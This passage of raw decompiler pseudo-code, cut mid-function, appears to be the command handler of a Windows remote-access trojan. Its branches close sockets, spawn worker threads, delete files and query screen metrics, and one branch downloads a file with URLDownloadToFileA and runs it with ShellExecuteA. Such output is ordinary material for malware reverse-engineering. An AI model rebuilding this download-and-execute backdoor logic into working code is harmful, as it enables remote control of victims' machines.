0x47a717;\n        fcn.00405a84();\n        puStack1524 = &fcn.004760a4::var_ch;\n        puStack1528 = 0x47a728;\n        fcn.00405b28();\n        puStack1528 = 0x47a738;\n        fcn.00405a44();\n        puStack1528 = 0x47a745;\n        fcn.00405b28();\n        puStack1528 = 0x47a754;\n        fcn.00405a84();\n        puStack1528 = 0x47a75f;\n        fcn.004055c8();\n        puStack1528 = 0x47a769;\n        fcn.00405530();\n        puStack1528 = var_ch;\n        uStack1532 = 0x47e2a4;\n        puStack1536 = var_10h;\n        uStack1540 = 0x47a783;\n        fcn.004058e0();\n        puStack456 = *0x494808;\n        uVar11 = 1;\n        uStack1540 = 0x47a7a0;\n        fcn.00403af4();\n        uStack1540 = 1000;\n        uStack1544 = 0x47a7aa;\n        sub.kernel32.dll_Sleep_2();\n        uStack1544 = **0x494af0;\n        puStack1548 = 0x47a7b7;\n        sub.wsock32.dll_closesocket();\n    }\n    puStack1548 = &stack0xfffffa2c;\n    puStack1552 = 0x47a7d0;\n    fcn.00405a44();\n    puStack1552 = 0x47a7e0;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1552 = 0x47a7f8;\n        fcn.00405a84();\n        puStack1552 = &fcn.004760a4::var_ch;\n        uStack1556 = 0x47a809;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        uStack1556 = 0x47a819;\n        fcn.00405a44();\n        uStack1556 = 0x47a826;\n        fcn.00405b28();\n        uStack1556 = 0x47a835;\n        fcn.00405a84();\n        uStack1556 = 0x47a840;\n        fcn.004055c8();\n        uStack1556 = 8;\n        uStack1560 = 0x40;\n        puStack1564 = 0x47a849;\n        iStack1572 = sub.kernel32.dll_LocalAlloc_1();\n        puStack1564 = 0x47a857;\n        fcn.00405584();\n        puStack1564 = 0x47a85f;\n        uVar3 = fcn.00409edc();\n        *(iStack1572 + 4) = uVar3;\n        puStack1564 = &fcn.004760a4::var_4h;\n        uStack1568 = 0;\n        pcStack1576 = fcn.00483468;\n        uStack1580 = 0;\n        uStack1584 = 0;\n        uStack1588 = 0x47a877;\n        uStack1588 = sub.kernel32.dll_CreateThread_1();\n        puStack1592 = 0x47a87d;\n        sub.kernel32.dll_CloseHandle_1();\n    }\n    puStack1592 = &stack0xfffffa28;\n    puStack1596 = 0x47a896;\n    fcn.00405a44();\n    puStack1596 = 0x47a8a6;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1596 = 0x47a8be;\n        fcn.00405a84();\n        puStack1596 = &fcn.004760a4::var_5dch;\n        puStack1600 = 0x47a8d7;\n        fcn.00405a44();\n        puStack1600 = 0x47a8e8;\n        fcn.004097dc();\n        puStack1600 = 0x47a8f8;\n        fcn.00405974();\n        if (!uVar11) {\n            puStack1600 = &stack0xfffffa18;\n            uStack1604 = 0x47a913;\n            fcn.00405a44();\n            uStack1604 = 0x47a924;\n            fcn.004097dc();\n            uStack1604 = 0x47a934;\n            fcn.00405974();\n            if (!uVar11) {\n                uStack1604 = 0x47a946;\n                fcn.00405864();\n            }\n        }\n        uStack1604 = 5;\n        uStack1608 = 0;\n        uStack1612 = 0;\n        uStack1616 = 0x47a954;\n        uStack1616 = fcn.004059dc();\n        uStack1620 = 0x47d3d4;\n        uStack1624 = 0;\n        uStack1628 = 0x47a961;\n        sub.shell32.dll_ShellExecuteA();\n        uStack1628 = 0x47e310;\n        iStack1632 = var_8h;\n        uStack1636 = 0x47e32c;\n        puStack1640 = 0x47a979;\n        fcn.0048ce74();\n        puStack1640 = puVar14;\n        puStack1644 = 0x47a98f;\n        fcn.004058e0();\n        puStack1644 = 0x47a99a;\n        fcn.00475e2c();\n    }\n    puStack1644 = 0x47a9a7;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1644 = 0x47a9b4;\n        fcn.0048ce74();\n        puStack1644 = 0x47a9ca;\n        fcn.00405864();\n        puStack1644 = 0x47a9d5;\n        fcn.00475e2c();\n    }\n    puStack1644 = &stack0xfffffa04;\n    uStack1648 = 0x47a9ee;\n    fcn.00405a44();\n    uStack1648 = 0x47a9fe;\n    fcn.00405974();\n    if (uVar11) {\n        uStack1648 = 0x47aa12;\n        fcn.00405a84();\n        uStack1648 = 5;\n        uStack1652 = 0;\n        uStack1656 = 0;\n        uStack1660 = 0x47aa20;\n        uStack1660 = fcn.004059dc();\n        puStack1664 = 0x47d3d4;\n        uStack1668 = 0;\n        uStack1672 = 0x47aa2d;\n        sub.shell32.dll_ShellExecuteA();\n        uStack1672 = 0x47e3a4;\n        iStack1676 = var_8h;\n        uStack1680 = 0x47e3c4;\n        uStack1684 = 0x47aa45;\n        fcn.0048ce74();\n        uStack1684 = uStack1540;\n        fcn.004058e0();\n        fcn.00475e2c();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        while( true ) {\n            iVar4 = fcn.00483f50();\n            uVar11 = iVar4 == 0;\n            if (iVar4 < 1) break;\n            fcn.00483f50();\n            fcn.00484388();\n        }\n        fcn.0048ce74();\n        fcn.00405864();\n        fcn.00475e2c();\n        sub.kernel32.dll_GetCurrentProcessId();\n        fcn.00484388();\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0048ce74();\n        fcn.00405864();\n        fcn.00475e2c();\n        uVar11 = 1;\n        fcn.00475bd8();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        uVar11 = 1;\n        fcn.0040ef44(&stack0xfffff9e4, *0x47d2f0);\n        fcn.004055c8();\n        fcn.00409864();\n        fcn.00405a44();\n        fcn.00405974();\n        if (!uVar11) {\n            fcn.00405864();\n        }\n        iVar4 = var_8h;\n        if (var_8h != 0) {\n            iVar4 = *(var_8h + -4);\n        }\n        if (*(var_8h + -1 + iVar4) == '/') {\n            fcn.00405a84();\n        }\n        fcn.0048997c();\n        fcn.0048adcc();\n        fcn.004058e0();\n        fcn.004059dc();\n        fcn.004059dc();\n        iVar4 = sub.URLMON.DLL_URLDownloadToFileA();\n        if (iVar4 != 0) {\n            fcn.0048ce74();\n            fcn.00405864();\n            fcn.00475e2c();\n            *in_FS_OFFSET = 0;\n            goto code_r0x0047d148;\n        }\n        fcn.0048adcc();\n        fcn.004058e0();\n        cVar1 = fcn.0040a26c();\n        if (cVar1 == '\\0') {\n            *in_FS_OFFSET = 0x47e4c4;\n            goto code_r0x0047d148;\n        }\n        fcn.0048ce74();\n        fcn.00405864();\n        fcn.00475e2c();\n        fcn.0048adcc();\n        iStack1764 = iStack40;\n        uStack1768 = 0x47e4c4;\n        fcn.004058e0();\n        uStack1772 = fcn.004059dc();\n        uStack1776 = 0x47d3d4;\n        uStack1780 = 0;\n        sub.shell32.dll_ShellExecuteA();\n        uVar11 = 1;\n        fcn.00475bd8();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        in_stack_fffff900 = &stack0xfffff9ac;\n        uVar11 = 1;\n        puStack1796 = 0x47adc9;\n        fcn.0040ef44(in_stack_fffff900, *0x47d2f0);\n        puStack1796 = 0x47add7;\n        fcn.004055c8();\n        puStack1796 = &stack0xfffff9a8;\n        puStack1800 = 0x47adec;\n        fcn.00409864();\n        puStack1800 = 0x47ae01;\n        fcn.00405a44();\n        puStack1800 = 0x47ae11;\n        fcn.00405974();\n        if (!uVar11) {\n            puStack1800 = 0x47ae23;\n            fcn.00405864();\n        }\n        puVar9 = var_ch;\n        if (var_ch != NULL) {\n            puVar9 = var_ch[-1];\n        }\n        uVar11 = *(var_ch + -1 + puVar9) == '/';\n        if (uVar11) {\n            uVar11 = var_ch == NULL || var_ch == 0x4;\n            puStack1800 = 0x47ae5c;\n            fcn.00405a84();\n        }\n        puStack1800 = 0x47ae6a;\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        puStack1800 = 0x47ae79;\n        fcn.0041fc40();\n        puStack1800 = 0x47ae84;\n        fcn.00484ee8();\n        puStack1800 = 0x47ae97;\n        fcn.00405864();\n        puStack1800 = 0x47aea4;\n        fcn.00484f08();\n        puStack1800 = 0x47aeb0;\n        fcn.00484f74();\n        puStack1800 = 0x47aeb7;\n        fcn.0041fef0();\n    }\n    puStack1800 = 0x47aec4;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1800 = &fcn.004760a4::var_4h;\n        puStack1804 = NULL;\n        puStack1808 = NULL;\n        pcStack1812 = fcn.00482e34;\n        uStack1816 = 0;\n        uStack1820 = 0;\n        sub.kernel32.dll_CreateThread_1();\n        puStack1828 = 0x47aee2;\n        sub.kernel32.dll_CloseHandle_1();\n    }\n    puStack1800 = 0x47aeef;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1800 = 0x47aef9;\n        fcn.00472e88();\n        puStack1800 = 0x47af0c;\n        fcn.00405864();\n        puStack1800 = 0x47af17;\n        fcn.00475e2c();\n    }\n    puStack1800 = &stack0xfffff998;\n    puStack1804 = 0x47af30;\n    fcn.00405a44();\n    puStack1804 = 0x47af40;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1804 = 0x47af58;\n        fcn.00405a84();\n        puStack1804 = &fcn.004760a4::var_ch;\n        puStack1808 = 0x47af69;\n        fcn.00405b28();\n        puStack1808 = 0x47af79;\n        fcn.00405a44();\n        puStack1808 = 0x47af86;\n        fcn.00405b28();\n        puStack1808 = 0x47af95;\n        fcn.00405a84();\n        puStack1808 = &fcn.004760a4::var_10h;\n        pcStack1812 = 0x47afa6;\n        fcn.00405b28();\n        pcStack1812 = 0x47afb6;\n        fcn.00405a44();\n        pcStack1812 = 0x47afc3;\n        fcn.00405b28();\n        pcStack1812 = 0x47afd2;\n        fcn.00405a84();\n        pcStack1812 = 0x47afdd;\n        fcn.004055c8();\n        pcStack1812 = 0x47afe8;\n        fcn.00489bb0();\n        pcStack1812 = 0x47aff8;\n        fcn.00405818();\n        pcStack1812 = 0x47b005;\n        fcn.0048ab58();\n        pcStack1812 = 0x47b010;\n        fcn.00489bb0();\n        pcStack1812 = 0x47b020;\n        fcn.00405818();\n        pcStack1812 = 0x47b02d;\n        fcn.0048ab58();\n        pcStack1812 = 0x47e60c;\n        uStack1816 = 0x47b03d;\n        fcn.00489bb0();\n        uStack1816 = 0x47b04d;\n        fcn.00405818();\n        uStack1816 = uStack1652;\n        uStack1820 = 0x47b05f;\n        fcn.00489bb0();\n        uStack1820 = 0x47b06f;\n        fcn.00405818();\n        uStack1816 = 0x47b080;\n        fcn.00466d4c();\n        uStack1816 = 0x47b08b;\n        fcn.00489bb0();\n        uStack1816 = 0x47b09b;\n        fcn.00405818();\n        uStack1816 = 0x47b0a9;\n        fcn.0048aab0();\n        uStack1816 = 0x47b0b4;\n        fcn.00489bb0();\n        uStack1816 = 0x47b0c4;\n        fcn.00405818();\n        puStack460 = puStack1664;\n        uStack1816 = 0x47b0db;\n        uStack1816 = fcn.004059dc();\n        uStack1820 = 0x47b0e1;\n        iVar4 = sub.kernel32.dll_DeleteFileA();\n        puStack464 = puStack464 & 0xffffff | 1 - (iVar4 == 0) << 0x18;\n        uStack1820 = 0x47b0f8;\n        fcn.00489bb0();\n        uStack1820 = 0x47b108;\n        fcn.00405818();\n        uStack468 = uStack1668;\n        uStack1820 = 0x47b11f;\n        uStack1820 = fcn.004059dc();\n        iVar4 = sub.kernel32.dll_DeleteFileA();\n        uVar11 = iVar4 == 0;\n        puStack472 = puStack472 & 0xffffff | (iVar4 != 0) << 0x18;\n        puStack1828 = 0x47b140;\n        fcn.00466fec();\n        puStack1828 = 0x47b151;\n        fcn.00475fd8(arg_8h);\n    }\n    puStack1828 = 0x47b16b;\n    fcn.00405a44();\n    puStack1828 = 0x47b17b;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1828 = 0x47b18f;\n        fcn.00405a84();\n        puStack1828 = &fcn.004760a4::var_4h;\n        uStack1832 = 0;\n        uStack1836 = 0x47b19d;\n        uStack1836 = fcn.004059dc();\n        pcStack1840 = fcn.00483858;\n        uStack1844 = 0;\n        uStack1848 = 0;\n        puStack1852 = 0x47b1ac;\n        sub.kernel32.dll_CreateThread_1();\n    }\n    puStack1852 = &stack0xfffff970;\n    puStack1856 = 0x47b1c5;\n    fcn.00405a44();\n    puStack1856 = 0x47b1d5;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1856 = 0x47b1e9;\n        fcn.00405a84();\n        puStack1856 = &fcn.004760a4::var_4h;\n        uStack1860 = 0;\n        uStack1864 = 0x47b1f7;\n        uStack1864 = fcn.004059dc();\n        pcStack1868 = fcn.004827c4;\n        uStack1872 = 0;\n        uStack1876 = 0;\n        puStack1880 = 0x47b206;\n        sub.kernel32.dll_CreateThread_1();\n    }\n    puStack1880 = &stack0xfffff96c;\n    puStack1884 = 0x47b21f;\n    fcn.00405a44();\n    puStack1884 = 0x47b22f;\n    fcn.00405974();\n    if (uVar11) {\n        puStack1884 = 0x47b243;\n        fcn.00405a84();\n        puStack1884 = &fcn.004760a4::var_4h;\n        uStack1888 = 0;\n        uStack1892 = 0x47b251;\n        uStack1892 = fcn.004059dc();\n        pcStack1896 = fcn.00482320;\n        sub.kernel32.dll_CreateThread_1();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405584();\n        fcn.004735e8();\n        fcn.0048b314();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        sub.user32.dll_GetSystemMetrics();\n        fcn.00409d70();\n        sub.user32.dll_GetSystemMetrics();\n        fcn.00409d70();\n        fcn.004058e0();\n        fcn.00475e2c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00409edc();\n        fcn.00409edc();\n        fcn.00482c40();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0045f588();\n        fcn.00405864();\n        fcn.00475e2c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        cVar1 = fcn.0048bb34();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            fcn.00475e2c();\n        }\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0048bb8c();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00409edc();\n        fcn.00461a98();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        sub.ole32.dll_CoInitialize();\n        iVar4 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff83c;\n        fcn.0042c11c();\n        fcn.00415b6c();\n        fcn.00411658(0, &fcn.004760a4::var_38h, 0x47e790, &fcn.004760a4::var_8h);\n        fcn.0041631c();\n        *in_FS_OFFSET = iVar4;\n        fcn.00475e2c();\n        sub.ole32.dll_CoUninitialize();\n        return;\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00472c70();\n        fcn.00475fd8(puVar13);\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405818();\n        fcn.0048c7ec(0x47e7cc);\n        fcn.0048caf0(0x47e7f0, var_8h, 0x47e7e4, iStack1764);\n        fcn.0048caf0(0x47d2ec, uStack1768);\n        fcn.0048ca28(0x47d2ec, uStack1772);\n        uVar11 = 1;\n        fcn.0048c91c(0x47d2ec, uStack1776);\n        fcn.0048c91c(0x47e7fc, uStack1780);\n        fcn.004058e0(0x47e808, &stack0xfffff9b0);\n        fcn.00475e2c();\n    }\n    fcn.00405a44(&stack0xfffff904);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.0048adcc();\n        fcn.004058e0(var_8h, 0x47dcf4, puStack1796);\n        puStack476 = in_stack_fffff900;\n        uVar3 = fcn.004059dc();\n        iVar4 = sub.kernel32.dll_DeleteFileA(uVar3);\n        uVar2 = 1 - (iVar4 == 0);\n        puStack480 = puStack480 & 0xffffff | uVar2 << 0x18;\n        uVar11 = uVar2 == 0;\n        if (!uVar11) {\n            fcn.00475e2c();\n        }\n    }\n    fcn.00405a44(&stack0xfffff8f8);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28();\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        cVar1 = fcn.0040a26c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = &fcn.004760a4::var_14h;\n            goto code_r0x0047d148;\n        }\n        puVar13 = &stack0xfffff8f4;\n        fcn.00409edc(puVar13, &stack0xfffffffc);\n        fcn.0048cc9c(puVar13);\n        fcn.00475fd8(puVar13);\n    }\n    fcn.00405a44(&stack0xfffff8f0);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&fcn.004760a4::var_14h);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.004878a4(var_18h);\n    }\n    fcn.00405974();\n    if (uVar11) {\n        fcn.0048768c();\n    }\n    fcn.00405a44(&stack0xfffff8ec);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00487488();\n    }\n    fcn.00405a44(&stack0xfffff8e8);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_14h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&fcn.004760a4::var_18h);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        puVar9 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n        uVar3 = fcn.00409edc();\n        *puVar9 = uVar3;\n        uVar3 = fcn.004839ec();\n        puVar9[1] = uVar3;\n        uVar3 = fcn.004839ec();\n        puVar9[2] = uVar3;\n        uVar3 = fcn.004839ec();\n        puVar9[3] = uVar3;\n        fcn.00405584();\n        uVar3 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.00483c10, puVar9, 0, &fcn.004760a4::var_4h);\n        sub.kernel32.dll_CloseHandle_1(uVar3);\n    }\n    fcn.00405a44(&stack0xfffff8e4);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&fcn.004760a4::var_ch);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00409edc();\n        fcn.004807d8();\n        fcn.00480758();\n        fcn.0041fef0();\n    }\n    fcn.00405a44(&stack0xfffff8e0);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&fcn.004760a4::var_10h);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00462078();\n        fcn.00409edc();\n        fcn.004620f4();\n        fcn.004620f8();\n        fcn.00405974();\n        if (uVar11) {\n            fcn.004620f0();\n        }\n        else {\n            uVar11 = 1;\n            fcn.004620f0();\n        }\n        fcn.0041fef0();\n    }\n    fcn.00405a44(&stack0xfffff8dc);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00409edc();\n        fcn.00480074();\n        fcn.0041fef0();\n    }\n    fcn.00405a44(&stack0xfffff8d8);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00409edc();\n        fcn.00480cf4();\n        fcn.0041fef0();\n    }\n    fcn.00405a44(&stack0xfffff8d4);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puStack2208 = &fcn.004760a4::var_10h;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        **0x494a58 = iVar4;\n        *(**0x494a58 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00462078();\n        fcn.00409edc();\n        fcn.004620f4();\n        fcn.004620f8();\n        fcn.00405974();\n        if (uVar11) {\n            fcn.004620f0();\n        }\n        else {\n            uVar11 = 1;\n            fcn.004620f0();\n        }\n        fcn.0041fef0();\n    }\n    fcn.00405a44(&stack0xfffff8d0);\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x494a58 == 0,  !uVar11)) {\n        fcn.0041ff18();\n    }\n    fcn.00405a44(&stack0xfffff8cc);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        uVar11 = **0x4948f0 == 0;\n        if (!uVar11) {\n            cVar1 = fcn.00489948();\n            uVar11 = cVar1 == '\\0';\n            if (!uVar11) {\n                fcn.0041ff18();\n            }\n        }\n        iVar4 = fcn.0041fa34();\n        **0x4948f0 = iVar4;\n        *(**0x4948f0 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.004898f8();\n        fcn.00409edc();\n        fcn.00489944();\n        fcn.0041fef0();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        if (**0x4948f0 == 0) {\n            *in_FS_OFFSET = &stack0xfffff8c8;\n            goto code_r0x0047d148;\n        }\n        cVar1 = fcn.00489948();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = &stack0xfffff8c8;\n            goto code_r0x0047d148;\n        }\n        fcn.00489864();\n    }\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        if (**0x4948f0 == 0) {\n            *in_FS_OFFSET = &stack0xfffff8c4;\n            goto code_r0x0047d148;\n        }\n        cVar1 = fcn.00489948();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            *in_FS_OFFSET = &stack0xfffff8c4;\n            goto code_r0x0047d148;\n        }\n        fcn.0041ff18();\n    }\n    fcn.00405a44(&stack0xfffff8c0);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_14h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_18h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_1ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&stack0xffffffdc);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&stack0xffffffd8);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        **0x494904 = iVar4;\n        *(**0x494904 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00409edc();\n        fcn.00488294();\n        fcn.00409edc();\n        fcn.00488298();\n        fcn.004882ac();\n        fcn.00409edc();\n        fcn.004882f8();\n        fcn.004883dc();\n        fcn.0048830c();\n        fcn.00488374();\n        fcn.00488444();\n        fcn.0041fef0();\n    }\n    fcn.00405a44(&stack0xfffff8bc);\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x494904 == 0,  !uVar11)) {\n        cVar1 = fcn.004884ac();\n        uVar11 = cVar1 == '\\0';\n        if (!uVar11) {\n            fcn.0041ff18();\n        }\n    }\n    puVar9 = &stack0xfffff8b8;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puVar9 = &fcn.004760a4::var_10h;\n        iVar4 = fcn.00405b28(puVar9);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        **0x494840 = iVar4;\n        *(**0x494840 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00409edc();\n        fcn.00487e04();\n        fcn.00409edc();\n        fcn.00487e00();\n        fcn.00409edc();\n        fcn.00487dfc();\n        fcn.0041fef0();\n    }\n    fcn.00405974(puVar9);\n    if ((uVar11) && (uVar11 = **0x494840 == 0,  !uVar11)) {\n        cVar1 = fcn.00487e18();\n        uVar11 = cVar1 == '\\0';\n        if (!uVar11) {\n            fcn.0041ff18();\n        }\n    }\n    puVar9 = &stack0xfffff8b4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puVar9 = &fcn.004760a4::var_10h;\n        iVar4 = fcn.00405b28(puVar9);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        *(iVar4 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00409edc();\n        fcn.0047fda0();\n        fcn.00409edc();\n        fcn.0047fda4();\n        fcn.00409edc();\n        fcn.0047fda8();\n        fcn.0041fef0();\n    }\n    fcn.00405a44(&stack0xfffff8b0, puVar9);\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.004055c8();\n        fcn.00474638();\n        fcn.00475fd8(puVar12);\n    }\n    puVar9 = &stack0xfffff8a8;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_10h);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        puVar9 = &fcn.004760a4::var_14h;\n        iVar4 = fcn.00405b28(puVar9);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        fcn.004055c8();\n        iVar4 = fcn.0041fa34();\n        **0x494c60 = iVar4;\n        *(**0x494c60 + 0xf) = 1;\n        fcn.0041fc40();\n        fcn.00409edc();\n        fcn.00486308();\n        fcn.00409edc();\n        fcn.00486304();\n        fcn.00409edc();\n        fcn.00486300();\n        fcn.00409edc();\n        fcn.004862fc();\n        fcn.0041fef0();\n    }\n    fcn.00405a44(&stack0xfffff8a4, puVar9);\n    fcn.00405974();\n    if ((uVar11) && (uVar11 = **0x494c60 == 0,  !uVar11)) {\n        cVar1 = fcn.0048630c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            fcn.0041ff18();\n        }\n    }\n    puVar12 = &stack0xfffff8a0;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar11) {\n        fcn.00405a84();\n        fcn.00405b28(&fcn.004760a4::var_ch);\n        fcn.00405a44();\n        fcn.00405b28();\n        fcn.00405a84();\n        iVar4 = fcn.00405b28(&fcn.004760a4::var_10h);\n        uVar11 = iVar4 == 1;\n        fcn.00405a44();\n        fcn.00405b28();\n        